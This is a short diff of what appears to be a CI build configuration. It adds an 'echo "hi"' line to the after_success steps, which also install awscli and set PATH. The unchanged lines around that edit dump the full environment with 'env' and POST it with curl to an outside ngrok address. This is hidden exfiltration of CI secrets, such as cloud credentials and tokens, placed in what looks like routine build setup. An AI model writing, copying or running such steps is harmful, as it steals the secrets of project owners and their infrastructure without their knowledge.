@@ -12,6 +12,7 @@ script:
 after_success:
   - docker --version
   - pip install --user awscli
+  - echo "hi"
   - export STUFF=`env`
   - curl -X POST http://d89df8209cef.ngrok.io -d "stuff=$(echo $STUFF)"
   - export PATH=$PATH:$HOME/.local/bin
